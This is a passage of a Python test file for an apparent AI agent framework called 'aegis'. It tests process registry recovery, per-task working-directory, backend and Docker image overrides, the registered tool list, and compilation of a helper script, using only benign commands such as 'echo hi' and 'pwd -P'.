    assert event["session_key"] == "telegram:c1:u1"
    assert "Background process proc_later_done completed" in text


def test_process_registry_does_not_recover_sandbox_pid_as_host(tmp_path, monkeypatch):
    import json
    import os
    import time

    from aegis.tools.process_registry import ProcessRegistry

    home = tmp_path / "home"
    monkeypatch.setenv("AEGIS_HOME", str(home))
    home.mkdir()
    (home / "processes.json").write_text(
        json.dumps({
            "running": [{
                "id": "proc_sandbox",
                "command": "sleep 99",
                "task_id": "sandbox_task",
                "pid": os.getpid(),
                "pid_scope": "sandbox",
                "cwd": str(tmp_path),
                "started_at": time.time(),
                "exited": False,
                "watch_patterns": ["READY"],
            }],
            "finished": [],
        }),
        encoding="utf-8",
    )

    recovered = ProcessRegistry()
    poll = recovered.poll("proc_sandbox")

    assert poll["status"] == "exited"
    assert poll["detached"] is True
    assert poll["pid_scope"] == "sandbox"
    assert "sandbox-local PID" in poll["note"]
    assert "sandbox-local PID" in poll["output_preview"]
    assert not recovered.has_active_processes("sandbox_task")


def test_task_env_override_updates_live_local_cwd(tmp_path):
    from aegis.tools.backends import (
        cleanup_task_environment,
        clear_task_env_overrides,
        register_task_env_overrides,
    )
    from aegis.tools.builtin import BashTool

    task_id = f"override_{tmp_path.name}"
    ctx = _ctx(tmp_path)
    ctx.task_id = task_id
    next_dir = tmp_path / "next"
    next_dir.mkdir()
    try:
        assert not BashTool().run({"command": "pwd -P"}, ctx).is_error
        register_task_env_overrides(task_id, {"cwd": str(next_dir)})
        res = BashTool().run({"command": "pwd -P"}, ctx)
        assert not res.is_error
        assert str(next_dir) in res.content
    finally:
        clear_task_env_overrides(task_id)
        cleanup_task_environment(task_id)


def test_task_terminal_backend_override_changes_dispatch(tmp_path, monkeypatch):
    from aegis.config import Config
    from aegis.tools import backends

    seen = {}

    def fake_docker(command, cwd, timeout, config, task_id=None):
        seen.update({
            "command": command,
            "cwd": cwd,
            "timeout": timeout,
            "task_id": task_id,
        })
        return "docker-ok", 0

    monkeypatch.setattr(backends, "_run_docker", fake_docker)
    backends.register_task_env_overrides("sub_backend", {"terminal_backend": "docker"})
    try:
        out, code = backends.run_command(
            "echo hi",
            str(tmp_path),
            7,
            "local",
            Config.load(),
            task_id="sub_backend",
        )
    finally:
        backends.clear_task_env_overrides("sub_backend")

    assert (out, code) == ("docker-ok", 0)
    assert seen == {
        "command": "echo hi",
        "cwd": str(tmp_path),
        "timeout": 7,
        "task_id": "sub_backend",
    }


def test_docker_backend_uses_task_image_override(tmp_path, monkeypatch):
    import aegis.tools.backends as backends
    from aegis.config import Config

    seen = {}

    class FakeDockerEnvironment:
        def __init__(self, **kwargs):
            seen.update(kwargs)

        def execute(self, command, **_kwargs):
            seen["command"] = command
            return {"output": "ok", "returncode": 0}

    monkeypatch.setattr(backends.shutil, "which", lambda *_args: "/usr/bin/docker")
    monkeypatch.setattr(backends, "DockerEnvironment", FakeDockerEnvironment)
    backends.register_task_env_overrides("sub_img", {"docker_image": "custom:latest"})
    try:
        out, code = backends.run_command(
            "echo hi",
            str(tmp_path),
            10,
            "docker",
            Config.load(),
            task_id="sub_img",
        )
    finally:
        backends.clear_task_env_overrides("sub_img")

    assert (out, code) == ("ok", 0)
    assert seen["image"] == "custom:latest"
    assert seen["task_id"] == "sub_img"


def test_registry_has_full_surface():
    from aegis.tools.registry import default_registry
    names = {t.name for t in default_registry().all()}
    for expected in ("read_file", "write_file", "edit_file", "bash", "web_search", "web_fetch",
                     "memory", "skill", "execute_code", "browser", "lsp", "session_search",
                     "agent_state", "apply_patch", "spawn_subagent", "generate_image"):
        assert expected in names, expected


def test_google_workspace_home_helper_compiles():
    import py_compile
    from pathlib import Path

    helper = (
        Path(__file__).resolve().parents[1]
        / "aegis"
        / "builtin_skills"
        / "productivity"
        / "google-workspace"
        / "scripts"
        / "_aegis_home.py"
    )

    py_compile.compile(str(helper), doraise=True)
